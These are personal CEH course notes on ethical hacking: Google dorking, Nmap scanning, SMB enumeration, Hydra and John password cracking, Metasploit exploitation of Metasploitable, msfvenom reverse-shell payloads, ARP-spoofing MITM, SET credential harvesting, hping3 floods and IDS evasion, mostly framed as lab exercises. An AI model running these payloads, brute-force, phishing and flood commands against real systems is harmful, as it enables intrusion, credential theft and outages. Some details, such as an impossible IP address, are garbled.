# CEH Notes

Personal study notes on ethical hacking tools, techniques, and commands — organized, with definitions, examples, and complete step-by-step walkthroughs.

**Trained at:** Texial (Ethical Hacking / CEH Training Center), Bengaluru

---

## Google Advanced Search Operators (Google Dorking)

**Google Dorking** is the practice of using advanced search operators to find specific, often sensitive, information indexed by Google — exposed files, login pages, cameras, config files, etc. It is a passive reconnaissance / OSINT technique (no direct contact with the target).

| Operator | Function |
|---|---|
| `cache:` | Displays the web page stored in Google's cache |
| `link:` | Lists web pages that have links to the specified web page |
| `related:` | Finds pages similar to the specified web page |
| `info:` | Presents information that Google has about a particular web page |
| `site:` | Restricts results to a specific web domain |
| `allintitle:` | Restricts results to pages whose title contains all the search keywords |
| `intitle:` | Restricts results to documents containing the search keyword in the title |
| `allinurl:` | Restricts results to those containing all the search keywords in the URL |
| `inurl:` | Restricts results to documents containing the search keyword in the URL |
| `location:` | Finds information for a specific location |
| `filetype:` | Restricts results to a specific file type |
| `intext:` | Finds pages containing the keyword anywhere in the body text |
| `allintext:` | Restricts results to pages containing all given keywords in the body text |
| `define:` | Shows the definition of a word |
| `numrange:` | Searches for a number within a given range |
| `inanchor:` | Finds pages whose inbound links use the given anchor text |
| `*` (wildcard) | Matches any word in a phrase |
| `..` (number range) | Searches within a numeric range, e.g. `camera 2020..2024` |
| `-` (minus) | Excludes a term from results |

**Useful ready-made dork collection:** Google Hacking Database (GHDB) on exploit-db.com — curated dorks for finding exposed cameras, login panels, vulnerable files, etc.

### Examples

```
site:example.com filetype:pdf confidential          → finds confidential PDFs on a domain
intitle:"index of" "backup.sql"                     → finds exposed database backup files
inurl:login site:example.com                        → finds login pages on a domain
cache:example.com                                   → view Google's cached copy of a page
filetype:env "DB_PASSWORD"                          → finds leaked .env files with credentials
```

### Step-by-step: finding exposed files on a target domain
1. Identify the target's root domain, e.g. `example.com`.
2. Run `site:example.com filetype:pdf` to list all indexed PDFs.
3. Narrow down with keywords: `site:example.com filetype:pdf "internal use only"`.
4. Check GHDB (exploit-db.com/google-hacking-database) for dorks matching the target's known tech stack (e.g. a specific CMS).
5. Record any exposed documents, login panels, or directories found — this becomes part of the passive recon report.

---

## Footprinting

**Footprinting (Reconnaissance)** is the first phase of ethical hacking — gathering as much information as possible about a target (organization, network, people) before engaging it. Split into:
- **Passive footprinting** — gathering info without directly interacting with the target (Google dorking, WHOIS, social media, job postings).
- **Active footprinting** — directly interacting with the target systems (ping, traceroute, port scans) — carries more risk of detection.

### Tools

- **Netcraft** (website) — infrastructure and tech used by a site
- **IP2Location**
- **Startpage** (website) — private search engine
- **pentest-tools.com** (website) — actual security testing
- **whois** (website) — trace/find ownership domain info
- **host**
- **dig**
- **nslookup** (website) — all DNS records for a domain
- **OSINT Framework** (website) — people-find/free OSINT tool
- **Fierce** — DNS reconnaissance / subdomain brute-forcer
- **Arin.net** — regional internet registry lookup (IP block ownership)

**Start Page tools (additional):**
- Subfinder — subdomain enumeration
- Sublist3r — subdomain enumeration via search engines
- Whatweb — identifies web technologies used on a site
- Tineye — reverse image search
- ChatPDF — summarize/query PDF documents
- Recon-dog — all-in-one recon tool
- ExifTool — metadata extraction
- DNSrecon — DNS enumeration script
- DNSdumpster — free domain research/DNS recon tool
- DorkGPT — AI-assisted Google dork generator

**Additional tools not in original list:**
- **theHarvester** — gathers emails, subdomains, names, employees from public sources
- **Maltego** — graphical link-analysis OSINT tool
- **Shodan** — search engine for internet-connected devices (IoT, servers, webcams)
- **Censys** — internet-wide device/certificate search engine
- **Recon-ng** — modular web reconnaissance framework
- **SpiderFoot** — automated OSINT reconnaissance tool
- **BuiltWith** — identifies the tech stack of a website
- **Wayback Machine (archive.org)** — historical snapshots of a website
- **Social Engineering via LinkedIn/social media** — employee/org chart footprinting

### Examples

```bash
whois example.com                        # registrant, registrar, name servers
nslookup example.com                      # resolves domain to IP
dig example.com ANY                       # all DNS records
dig axfr @ns1.example.com example.com     # attempt zone transfer
host -t mx example.com                    # mail server records
theHarvester -d example.com -b google,bing -l 200   # emails/subdomains
sublist3r -d example.com                  # subdomain enumeration
whatweb example.com                       # fingerprint web technologies
```

### Step-by-step: full passive + active footprint of a target domain
1. **WHOIS lookup** — `whois example.com` to get registrant org, registrar, creation date, name servers.
2. **DNS enumeration** — `dig example.com ANY` and `nslookup -type=ns example.com` to list name servers, MX records, TXT records (SPF/DKIM can reveal mail provider).
3. **Subdomain discovery** — run `sublist3r -d example.com` and `subfinder -d example.com`, merge/dedupe the results.
4. **Technology fingerprinting** — run `whatweb <subdomain>` on each live subdomain to identify CMS, server software, frameworks.
5. **Email/employee harvesting** — `theHarvester -d example.com -b all` to collect employee emails and names for later social-engineering/phishing scenarios.
6. **Historical data** — check archive.org's Wayback Machine for old versions of the site (may reveal retired endpoints or leaked info).
7. **Shodan/Censys** — search `hostname:example.com` on Shodan to find exposed services/ports associated with the org's IP ranges.
8. Compile all findings (IP ranges, subdomains, emails, tech stack, employees) into a footprinting report before moving to active scanning.

---

## Network Scanning

**Network scanning** is the active phase of reconnaissance — probing a live network to identify hosts, open ports, running services, and the OS. Relies on the TCP three-way handshake (SYN → SYN-ACK → ACK) to determine port state.

### Tools

- Nmap — the industry-standard scanner
- Zenmap — GUI front-end for Nmap
- Masscan — extremely fast internet-scale port scanner
- Angry IP Scanner — lightweight cross-platform IP/port scanner
- Advanced IP Scanner — Windows network scanner
- Metasploit — exploitation framework with scanning modules
- Hping3 — packet crafting tool, used for scanning and DoS
- **Unicornscan** — async network reconnaissance tool
- **SuperScan** — Windows TCP port scanner

### Nmap — Host Discovery Techniques

*Host discovery* determines whether a target is "alive" before a full port scan.

- **ICMP Ping Scan** → ICMP Echo Ping: `nmap -sn -PE <ip>` → ICMP Echo Ping Sweep: `nmap -sn -PE <range>`
- **ARP Ping Scan**: `nmap -sn -PR <>` — most reliable on local LAN (uses ARP, not blocked by firewalls on-segment)
- **UDP Ping Scan**: `nmap -sn -PU <>` → ICMP Timestamp Ping: `nmap -sn -PP <>`
- **TCP Ping Scan** → ICMP Address Mask Ping: `nmap -sn -PM <>`
- **IP Protocol Ping Scan**: `nmap -sn -PO <>`
- TCP SYN Ping: `nmap -sn -PS <>`
- TCP ACK Ping: `nmap -sn -PA <>`

### Nmap — Port Scanning Techniques

- **TCP Scanning** → Open TCP → TCP Connect/Full Open Scan: `nmap -sT -v <>` — completes full 3-way handshake, noisy/logged
- Stealth TCP Scanning → Half Open Scan: `nmap -sS -v <>` — sends SYN, doesn't complete handshake, stealthier
- Inverse TCP Flag Scan: `nmap -(-sF,-sN,-sX) -v <>` — FIN/Null/Xmas scans, useful for bypassing simple firewalls
- ACK Flag Probe Scan: `nmap -sA -v <>` — used to map firewall rulesets, not to find open ports
- **UDP Scanning**: `nmap -sU -v <>` — slower, used for UDP services (DNS, SNMP, etc.)
- **IPv6 Scanning**: `nmap -6 <>`
- **SCTP Scanning** → SCTP INIT Scan: `nmap -sY -v <>` / SCTP Cookie Echo Scan: `nmap -sZ -v <>`

### Basic Scanning with Nmap

| Command | Function |
|---|---|
| `nmap IP` | Simple service scan |
| `nmap -sV IP` | Service version scan |
| `nmap -p- IP` | Scans all 65,535 ports |
| `nmap -O IP` | OS detection scan |
| `nmap -sn IP` | Ping scan (no port scan) |
| `nmap -sU IP` | UDP scan |
| `nmap -v IP` | Verbose output |
| `nmap -sS IP` | SYN/stealth scan |
| `nmap -A IP` | Aggressive scan (OS, version, script, traceroute) |
| `nmap --traceroute` | Traceroute to target |
| `nmap IP -sC` | Default script scan |
| `nmap -T0` to `-T5` | Timing templates (paranoid → insane); slower = stealthier |
| `nmap -oN/-oX/-oG file` | Output results in normal/XML/grepable format |

### Example

```bash
nmap -sn 192.168.1.0/24                  # discover live hosts on the subnet
nmap -sS -sV -O -p- 192.168.1.10 -oN scan.txt   # full stealth+version+OS scan, saved to file
```

### Step-by-step: scanning a target subnet end-to-end
1. **Host discovery**: `nmap -sn 192.168.1.0/24` → produces a list of live hosts (e.g. `.1`, `.5`, `.10`).
2. **Quick port scan** on a live host: `nmap 192.168.1.10` → shows common open ports (e.g. 22, 80, 445).
3. **Full port scan**: `nmap -p- 192.168.1.10` → scans all 65,535 ports to catch non-standard services.
4. **Service/version detection**: `nmap -sV 192.168.1.10` → identifies software + version on each open port (e.g. `OpenSSH 7.4`, `Apache 2.4.18`).
5. **OS detection**: `nmap -O 192.168.1.10` → fingerprints the likely OS.
6. **Default script scan**: `nmap -sC 192.168.1.10` → runs safe NSE scripts (banner grabbing, basic vuln checks).
7. **Combine into one pass**: `nmap -A -p- 192.168.1.10 -oN full_scan.txt` → aggressive scan with all of the above, saved for later reference.
8. Use the resulting service/version list to look up matching CVEs (via `searchsploit <service> <version>` or exploit-db.com) before moving into enumeration/exploitation.

---

## Enumeration

**Enumeration** is the process of actively connecting to a target system/service and extracting detailed information — usernames, shares, groups, SNMP strings, DNS records — that can be used for exploitation. It follows scanning and happens over an established connection.

### Tools

- nmap nse — Nmap Scripting Engine (NSE) for automated enumeration
- nbtstat / `nbtstat -a IP` — NetBIOS enumeration (Windows)
- dnsenum — DNS enumeration
- Amass — in-depth attack surface mapping / asset discovery
- smtp-user-enum — enumerates valid users via SMTP (VRFY/EXPN/RCPT)
- smbmap — enumerates SMB share permissions
- smbclient — connects to/enumerates SMB shares
- enum4linux — Linux tool for enumerating Windows/Samba hosts
- nslookup — DNS record enumeration

**Additional enumeration tools/techniques:**
- **enum4linux-ng** — updated Python version of enum4linux
- **SNMP enumeration**: `snmpwalk`, `snmp-check`, `onesixtyone` — walk SNMP MIBs/community strings
- **LDAP enumeration**: `ldapsearch`, JXplorer — query Active Directory/LDAP directories
- **NTP enumeration**: `ntptrace`, `ntpdc`, `ntpq`
- **SMTP enumeration**: `smtp-user-enum`, manual `VRFY`/`EXPN` via `telnet <ip> 25`
- **RPC enumeration**: `rpcclient`, `rpcinfo`
- **DNS zone transfer**: `dig axfr @ns1.target.com target.com`

### Examples

```bash
enum4linux -a 192.168.1.10               # full Windows/Samba enumeration
smbclient -L //192.168.1.10 -N           # list SMB shares anonymously
smbmap -H 192.168.1.10                   # enumerate share permissions
snmpwalk -v1 -c public 192.168.1.10      # SNMP walk with default community string
rpcclient -U "" 192.168.1.10             # null session RPC enumeration
```

### Step-by-step: SMB/NetBIOS enumeration of a Windows host
1. Confirm port 445/139 is open: `nmap -p 139,445 192.168.1.10`.
2. List shares anonymously: `smbclient -L //192.168.1.10 -N`.
3. If shares are found, connect: `smbclient //192.168.1.10/SHARE_NAME -N`.
4. Check share permissions: `smbmap -H 192.168.1.10`.
5. Run full enumeration: `enum4linux -a 192.168.1.10` → extracts OS info, users, groups, shares, password policy.
6. Cross-reference any usernames found against a password list in a brute-force attempt (see Password Cracking section).

---

## Vulnerability Management Life Cycle

**Vulnerability management** is the ongoing, cyclical process of identifying, classifying, remediating, and mitigating vulnerabilities in a system.

1. Identify Assets
2. Create a Baseline
3. Vulnerability Scan
4. Vulnerability Analysis
5. Risk Assessment
6. Remediation
7. Verification
8. Monitoring

(Cycle: Identify Assets → Create Baseline → Vulnerability Scan → Vulnerability Analysis → Risk Assessment → Remediation → Verification → Monitoring → back to Identify Assets)

### Vulnerability Research Websites

- securityfocus.com
- darkreading.com
- securitymagazine.com
- vulnerability-lab.com
- pentesting.com
- packetstormsecurity.com
- exploit-db.com — searchable exploit/PoC database
- hackerstorm.co.uk
- **cve.mitre.org** — Common Vulnerabilities and Exposures database
- **nvd.nist.gov** — National Vulnerability Database (CVSS scoring)
- **cert.org** — CERT Coordination Center advisories

### Example: looking up a vulnerability for a found service
```bash
searchsploit apache 2.4.18          # offline exploit-db search for a known version
```
1. From your Nmap `-sV` scan, note the exact service + version (e.g. `vsftpd 2.3.4`).
2. Search exploit-db.com or `searchsploit vsftpd 2.3.4` for known CVEs/exploits.
3. Cross-check severity using CVSS score on nvd.nist.gov.
4. Decide whether to proceed to exploitation (in an authorized test) or log it in the vulnerability report.

---

## Types of Vulnerability Scanning

- External — scans from outside the network perimeter
- Network Based — scans network devices/services
- Non-Credential — scans without login access, limited visibility
- Internal — scans from inside the network
- Application — scans web/software applications specifically
- Manual — human-driven testing, not automated
- Host Based — scans an individual host/endpoint
- Credential(ed) — scans with valid login credentials, deeper visibility
- Automated — tool-driven, scheduled scanning

### Vulnerability Assessment Tools

- Nessus — widely used commercial VA scanner
- GFI LanGuard
- OpenVAS — open-source vulnerability scanner
- Nikto — web server vulnerability scanner
- Qualys — cloud-based VA/compliance platform
- Skipfish — web application security reconnaissance tool
- Wapiti — web application vulnerability scanner
- **Nexpose (Rapid7 InsightVM)** — enterprise VA platform
- **Retina** — network vulnerability scanner
- **Core Impact** — commercial penetration testing/VA tool

### Step-by-step: running a basic OpenVAS/Nessus scan
1. Install and start the scanner service (OpenVAS: `gvm-setup` then `gvm-start`; Nessus: install `.deb`/`.rpm`, start service, open web UI on `https://localhost:8834`).
2. Log in to the web UI and create a new **Target** (enter the IP/range to scan).
3. Create a new **Task/Scan** and attach it to the target; choose a scan policy (e.g. "Full and fast" in OpenVAS).
4. Launch the scan and wait for completion (can take minutes to hours depending on scope).
5. Review the generated report — vulnerabilities are usually ranked by severity (Critical/High/Medium/Low) with CVE references.
6. Export the report (PDF/CSV) and prioritize remediation starting with Critical/High findings.

---

## Password Cracking

**Password cracking** is the process of recovering passwords from stored or transmitted data, used to test password strength or gain unauthorized access.

- **Brute Force Attack** → tries all possible character combinations — slow but guaranteed given enough time
- **Dictionary Attack** → tries a list of common/likely passwords (e.g. rockyou.txt)
- **Rainbow Table Attack** → precomputed hash-to-password lookup tables, matches common password hashes quickly
- **Credential Stuffing** → reuses leaked username & password pairs from other breaches against a new target
- **Password Spraying** → tries one or a few common passwords across many accounts (avoids lockouts)
- **Keylogging** → captures keystrokes to steal credentials as typed

### Tools
- **Hydra** — online brute-force tool for many protocols
- **John the Ripper** — offline password hash cracker
- **Hashcat** — GPU-accelerated offline hash cracker
- **Cain & Abel** — Windows password recovery/sniffing suite
- **Ophcrack** — rainbow-table based Windows password cracker
- **L0phtCrack** — Windows password auditing tool
- **Medusa** — parallel online brute-force tool (similar to Hydra)

### Brute Force Attack — Hydra

```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -outstat ftp://IP(target) -VV
```

### Enumeration (Nmap scripting)

```
nmap -sV -O -p80 <ip>
cd /usr/share/nmap/scripts

nmap -sV --script http-enum <ip>

nmap <ip> -p80 --script=http-frontpage-login

nmap --script http-passwd --script-args http-passwd.root=/ <target ip>
```

### Examples

```bash
# Hydra against SSH with a single known username
hydra -l admin -P rockyou.txt ssh://192.168.1.10

# John the Ripper cracking a Linux shadow hash
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt

# Hashcat cracking an MD5 hash with a wordlist
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### Step-by-step: online brute force with Hydra (lab target)
1. Confirm the service and port are open and reachable: `nmap -p 22 192.168.1.10`.
2. Gather/guess a username list (`user.txt`) from earlier enumeration.
3. Choose a password wordlist (commonly `/usr/share/wordlists/rockyou.txt` on Kali).
4. Run: `hydra -L user.txt -P rockyou.txt ssh://192.168.1.10 -V`.
5. Wait for Hydra to report `[22][ssh] host: ... login: ... password: ...` on a successful match.
6. Validate the found credentials by manually logging in: `ssh <user>@192.168.1.10`.
7. Document the weak credential as a finding with remediation advice (enforce password policy, account lockout, MFA).

### Step-by-step: offline hash cracking with John the Ripper
1. Obtain the password hash file (e.g. dumped `/etc/shadow` after gaining access, or a hash leaked from a database).
2. If it's a Linux shadow file, combine: `unshadow /etc/passwd /etc/shadow > combined.txt`.
3. Run John: `john combined.txt` (uses its default wordlist first, then incremental/brute-force mode).
4. Check cracked passwords: `john --show combined.txt`.
5. For hash-only lists (e.g. NTLM, MD5), specify format: `john --format=NT hashes.txt --wordlist=rockyou.txt`.

---

## Attack / Hacking Metasploitable

1. Create a file in Metasploitable
2. Scan the app OS on Kali (nbtscan / etc.)
3. Find out the framework version (`-sV`)
4. Search in Google → Rapid7
5. `msfconsole` — type it in Kali
6. Search version name in `msf` (Kali) [search version]
7. Use the version [`use <version>`]
8. Enter `(type)` → options
   - `set rhosts <ip>` → RHOST (IP → RHOST)
   - `set rport <port>` → RPORT (Port → RPORT)
9. Check again in the options
10. If matched with target, type → `exploit`

Type `/bin/bash -i` (in empty space) to get `root@metasploitable`.
Type `exit` to exit.

**Metasploit basics:** `msfconsole` → `search <name/CVE>` → `use <module>` → `show options` → `set <option> <value>` → `show payloads` → `set payload <payload>` → `exploit`/`run`.

### Full worked example: exploiting vsftpd 2.3.4 backdoor on Metasploitable 2
```bash
# 1. Scan the target for the service/version
nmap -sV -p 21 192.168.1.20

# 2. Open Metasploit
msfconsole

# 3. Search for the matching exploit module
search vsftpd

# 4. Select the module
use exploit/unix/ftp/vsftpd_234_backdoor

# 5. View required options
show options

# 6. Set the target
set RHOSTS 192.168.1.20

# 7. Run the exploit
exploit

# 8. On success, you land in a root shell — stabilize it:
/bin/bash -i
```
This is the classic CEH/Metasploitable lab example of exploiting a known backdoored service version.

---

## Malware

**Malware (malicious software)** is any software intentionally designed to cause damage, steal data, or gain unauthorized access. Common types:
- **Virus** — attaches to a host file, needs user action to spread
- **Worm** — self-replicates across a network without user action
- **Trojan** — disguises itself as legitimate software
- **Ransomware** — encrypts data and demands payment
- **Rootkit** — hides its presence/privileges at a deep OS level
- **Spyware** — covertly monitors/collects user data
- **RAT (Remote Access Trojan)** — gives an attacker remote control of a victim's machine

### Tools to Create Malware

- njRAT
- Msfvenom
- Dark Horse Trojan Virus Maker
- Black Matter
- JPS Virus Maker
- DELmE's Batch Virus Maker
- Internet Worm Maker Thing

**Additional offensive-security payload/C2 frameworks:**
- **Shellter** — dynamic PE infector (AV evasion)
- **Veil-Evasion** — generates AV-evading payloads
- **TheFatRat** — backdoor/payload generator
- **Empire / Covenant** — post-exploitation C2 frameworks

### MSFVENOM

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe

# Android reverse shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -R > evil.apk

# Linux Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=4444 -f raw

# Linux ELF reverse shell
msfvenom -p linux/shell-reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
```

**Basic syntax:**
```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>
```

### Setup for Malware "Attacks" Using Msfvenom (Lab Simulation)

**Attacker:**
1. Create a file: `msfvenom -p <payload> LHOST= LPORT= -f <format> -o <output_file>`
2. Share the file to the victim (file sharing / upload / cloud)

**Attacker (listener):**
```
msfconsole
use exploit/multi/handler
set payload <payload_name>
set LHOST <ip> (attacker IP)
set LPORT <port>
exploit
```

### Full worked example: Windows reverse shell lab (attacker + listener)
```bash
# Step 1 — Attacker machine: generate the payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe

# Step 2 — Attacker machine: start the listener BEFORE sending the file
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit

# Step 3 — Transfer shell.exe to the victim machine (lab VM) and execute it there

# Step 4 — Back on the attacker's msfconsole, a Meterpreter session opens automatically:
sessions -l          # list active sessions
sessions -i 1         # interact with session 1
sysinfo               # confirm victim OS info
```

---

## Packet Sniffing

**Sniffing** is the interception/capture of network traffic. Can be:
- **Passive sniffing** — on a hub-based network, traffic is broadcast to all ports; no injection needed
- **Active sniffing** — on a switched network, requires techniques like ARP poisoning/MAC flooding to redirect traffic

### Mac Flooding on a Switch (LAN)
```
macof -i eth0 -n 100
```
Sends fake MAC/IP for a DoS attack / to overflow the switch's CAM table (forcing it into hub-like broadcast mode).

### DHCP Starvation Attack
DoS attack on a DHCP server by sending many MAC addresses/requests, exhausting its IP address pool.

**Tools:**
- dhcpstarvation.py (GitHub)
- Metasploit
- Hyenae
- DHCPig

### Example: capturing traffic with Wireshark
1. Open Wireshark, select the correct network interface (e.g. `eth0`/`wlan0`).
2. Apply a capture filter if needed (e.g. `host 192.168.1.10`) to limit noise.
3. Start capture, generate some traffic (browse a site, log into a test app over HTTP).
4. Stop capture, apply a display filter: `http.request` or `tcp.port == 80`.
5. Right-click a packet → *Follow → TCP Stream* to view the full conversation (can reveal cleartext credentials over unencrypted protocols).

---

## ARP Spoofing Attack (Man-in-the-Middle)

**ARP Spoofing** sends forged ARP messages to associate the attacker's MAC address with the IP of another host (e.g. the gateway), redirecting traffic through the attacker for interception or modification — a classic Man-in-the-Middle (MITM) technique.

**Tools:**
- **arpspoof**: `arpspoof -i eth0 -t 10.1.2.3.4.5.6.7`
- **Habu**: `habu arp-poison 10.1.2.3.4.5.6.7`
- bettercap
- Ettercap
- mitmproxy
- ARPSpoofer
- Yersinia
- **Cain & Abel** — Windows ARP poisoning + sniffing
- **Dsniff** — suite of MITM/sniffing tools

### Packet Sniffing Tools
- Wireshark — de-facto standard packet analyzer
- Capsa
- OmniPeek
- RITA
- Observer Analyzer
- **Tcpdump** — command-line packet capture tool
- **Ettercap** — MITM suite with sniffing/filtering

### Promiscuous Detection Tools
- **Nmap**: `nmap --script=sniffer-detect <target ip range>`
- NetscanTools Pro

### Step-by-step: classic ARP spoofing MITM with arpspoof + Wireshark
1. Enable IP forwarding on the attacker machine so traffic still reaches its destination: `echo 1 > /proc/sys/net/ipv4/ip_forward`.
2. Identify the victim IP (e.g. `192.168.1.20`) and the gateway IP (e.g. `192.168.1.1`) via `net.show` in bettercap or `arp -a`.
3. Poison the victim: `arpspoof -i eth0 -t 192.168.1.20 192.168.1.1`.
4. In a second terminal, poison the gateway (so replies also pass through you): `arpspoof -i eth0 -t 192.168.1.1 192.168.1.20`.
5. Start Wireshark/tcpdump on the attacker machine to capture the now-redirected traffic.
6. Analyze captured packets for cleartext data (HTTP logins, FTP, Telnet).
7. Stop the attack and restore ARP tables cleanly (`Ctrl+C` on arpspoof usually restores correct ARP entries automatically).

---

## Bettercap Tool → Network Sniffing

```
sudo bettercap -iface wlan0
```

- `net.probe on` → detect the connected devices on the network
- `net.show` → display the devices' IP, MAC & name connected on the network
- `set arp.spoof.targets <ip>` → spoof the target
- `set arp.spoof.fullduplex true` → establish full ARP spoofing
- `arp.spoof on`
- `net.sniff on`

### Step-by-step: full Bettercap MITM + sniff session
1. Launch: `sudo bettercap -iface wlan0`.
2. Discover hosts: `net.probe on` then wait a few seconds, then `net.show`.
3. Pick a target IP from the list, e.g. `192.168.1.20`.
4. Set the spoof target: `set arp.spoof.targets 192.168.1.20`.
5. Enable full-duplex spoofing (intercept both directions): `set arp.spoof.fullduplex true`.
6. Start spoofing: `arp.spoof on`.
7. Start sniffing captured traffic: `net.sniff on`.
8. Watch the console for captured credentials/URLs (HTTP, FTP, etc. shown in cleartext).
9. Stop with `arp.spoof off` and `net.sniff off`, then exit.

---

## Social Engineering & Phishing

**Social engineering** manipulates people (rather than systems) into divulging confidential information or performing actions that compromise security. Common types:
- **Phishing** — fraudulent emails/links impersonating trusted sources
- **Spear phishing** — targeted phishing at a specific individual/org
- **Vishing** — voice/phone-based social engineering
- **Smishing** — SMS-based phishing
- **Pretexting** — inventing a false scenario to extract info
- **Baiting** — offering something enticing (e.g. a USB drop) to lure a victim
- **Tailgating/Piggybacking** — physically following someone into a restricted area

### Phishing Tools

- Social Engineering Toolkit (SET)
- ShellPhish
- DarkPhish
- Blackeye
- IPLogger → for location
- SocialFish
- Modlishka
- Trape
- Gophish
- King Phisher
- Grabify → for info using custom link

### Step-by-step: credential-harvesting lab exercise with SET
1. Launch the toolkit: `setoolkit`.
2. Choose **1) Social-Engineering Attacks**.
3. Choose **2) Website Attack Vectors**.
4. Choose **3) Credential Harvester Attack Method**.
5. Choose **2) Site Cloner**.
6. Enter the attacker's IP (to host the clone) and the URL of the login page to clone.
7. SET hosts a convincing clone on port 80 of the attacker machine.
8. In a controlled lab, the "victim" visits the attacker's IP and enters credentials into the cloned form.
9. Captured credentials are written to a log file (shown in the SET console) for the awareness exercise.
10. Always run this only against systems/lab environments you're authorized to test.

---

## AI Tools

### AI to Create Videos
- Vidnoz → www.vidnoz.com
- DeepfakesWeb → www.deepfakesweb.com
- Synthesia → www.synthesia.com
- DeepBrain AI → www.deepbrain.io
- Hoodem → hoodem.com

### AI for Voice
- Murf.ai
- Resemble.ai
- ElevenLabs.io
- Play.ht
- Voice.ai
- Uneed.io

*(These AI tools are often referenced in CEH social-engineering/deepfake-awareness modules — understanding how deepfake audio/video can be used in vishing/BEC attacks.)*

---

## DoS / DDoS Attack

**DoS (Denial of Service)** overwhelms a single target system/service from one source, making it unavailable to legitimate users. **DDoS (Distributed DoS)** does the same using many distributed sources (often a botnet), making it harder to block.

**Categories:**
- **Volumetric attacks** — flood bandwidth (UDP flood, ICMP flood)
- **Protocol attacks** — exhaust server/network resources (SYN flood)
- **Application-layer attacks** — target application logic (HTTP flood, Slowloris)

- **LOIC (Low Orbit Ion Cannon)** → HTTP, UDP, TCP & ICMP flood attack
- **Ultra DDoS v2** → simple GUI for attack
- **HOIC (High Orbit Ion Cannon)** → Sourceforge
- **LOIC (Low Orbit Ion Cannon)** → Sourceforge
- **HULK** → GitHub
- **SlowLoris** → GitHub — keeps many HTTP connections open to exhaust server resources
- **UFONet** → ufonet.03c8.net

### DoS/DDoS Protection Tools
- Anti DDoS Guardian
- DDOS-Guard
- DOSarrest DDoS Protection Service
- Radware DefensePro X
- Gatekeeper
- F5 DDoS Attack Protection

### DoS/DDoS Protection Services
- Cloudflare
- Akamai DDoS Protection
- StormWall PRO
- Imperva DDoS Protection
- Nexusguard
- BlockDoS

### DoS/DDoS Attack Commands

```bash
# hping3
sudo hping3 --icmp --flood --rand-source <ip>
sudo hping3 -S -p 80 --flood --rand-source <ip>

# slowhttptest — DoS a URL
sudo slowhttptest -H -c 20000 -u <URL>
# (Range: how much you want)
```

### Step-by-step: lab SYN flood test with hping3
1. Identify the target lab IP and open port (e.g. `192.168.1.10:80`).
2. Run: `sudo hping3 -S -p 80 --flood --rand-source 192.168.1.10`.
3. Monitor target CPU/connection count (e.g. via `netstat -an | grep SYN_RECV` on the target) to observe the effect of half-open connections.
4. Stop the flood with `Ctrl+C`.
5. On the target, note mitigations that would help: SYN cookies, firewall rate-limiting, a reverse proxy/WAF.
6. Only ever run this against an isolated lab target you own/control.

---

## IDS / IPS / Firewalls / Honeypots

- **IDS (Intrusion Detection System)** — passively monitors and alerts on suspicious traffic
- **IPS (Intrusion Prevention System)** — actively monitors and blocks suspicious traffic in real time
- **Firewall** — filters traffic based on rules (network- or host-based)
- **Honeypot** — a decoy system designed to attract and study attackers

### IDS Tools
- Snort
- Suricata
- Samhain HIDS
- OSSEC
- Zeek
- Cisco Secure IPS

### IPS Tools
- Trellix Intrusion Prevention System
- Check Point Quantum IPS
- Atomic OSSEC
- McAfee Host Intrusion Prevention for Desktop
- Secure IPS
- Palo Alto Advanced Threat Prevention

### Firewall Tools

| Network Based | Host Based |
|---|---|
| Cisco Secure Firewall | Microsoft Defender Firewall |
| PA-7500 | ZoneAlarm Pro Firewall |
| Fortigate 7121F | Comodo Firewall |
| Check Point 28000 | Norton Smart Firewall |
| Juniper SRX | McAfee Firewall |

### Honeypot Tools
- HoneyBOT
- Blumira Honeypot Software
- NeroSwarm Honeypot
- Valhalla Honeypot
- Cowrie
- StingBox

### Bypassing Firewall & IDS/IPS

```bash
nmap <ip> -p80 -f                  # fragment packets
sudo nmap <ip> -p80 -g 80 -sN/-sX/-sF -vv
sudo nmap <ip> -p80 -g 80 --spoof-mac dell/HP/Cisco/random   # spoof MAC from another machine
sudo nmap <ip> -p80 -D RND:20      # decoy — fakes IPs to confuse scan trace
```

### Honeypot Tools (field)
- Valhala (Win)
- Pentbox (git, Linux)

### Step-by-step: running Snort as a basic IDS in a lab
1. Install Snort: `sudo apt install snort`.
2. During setup, specify the home network (e.g. `192.168.1.0/24`).
3. Write/edit a simple rule in `local.rules`, e.g.:
   ```
   alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001;)
   ```
2. Run Snort in IDS mode: `sudo snort -A console -q -c /etc/snort/snort.conf -i eth0`.
3. From another machine, ping the monitored host: `ping 192.168.1.10`.
4. Observe Snort's console alert firing for the ICMP traffic — confirms the rule and sensor are working.
5. Expand with more rules (e.g. detecting Nmap scans, known exploit signatures) as the lab progresses.

### Step-by-step: setting up a basic honeypot with Cowrie
1. Install Cowrie (SSH/Telnet honeypot): clone from GitHub, `pip install -r requirements.txt`.
2. Configure `cowrie.cfg` to listen on port 2222 (mapped externally to 22 if desired).
3. Start it: `bin/cowrie start`.
4. From an attacker machine, try to SSH into the honeypot: `ssh root@<honeypot-ip> -p 2222`.
5. Cowrie logs the attempted credentials and any commands the "attacker" runs inside the fake shell to `var/log/cowrie/cowrie.json`.
6. Review logs to study attacker behavior/techniques without risking a real system.

---

## Hacking Web Server

- `CIRT.net` → default password list
- Scan for open ports: `sudo nmap <ip> -f`
- Check for versions: `nmap 192.168.122.203 -p80,443 -sV` ; `nmap <ip> -p n1,n2,n3,...n -sV`
- Use netcat or telnet:
  - `nc <ip> <port> -v`
  - `GET / HTTP/1.0` (press Enter twice to get the version)
- Telnet: `telnet <ip> <port>` → `GET / HTTP/1.0` → Enter twice

```
cd /usr/share/nmap/scripts && ls | grep http
nmap -p80 --script http-passwd.nse
# check / enumerate the vulnerability
```

### Directory/File Brute-forcing Tools

- **Dirbuster** — tool used to check website vulnerability & enumeration (directory/file brute-force)
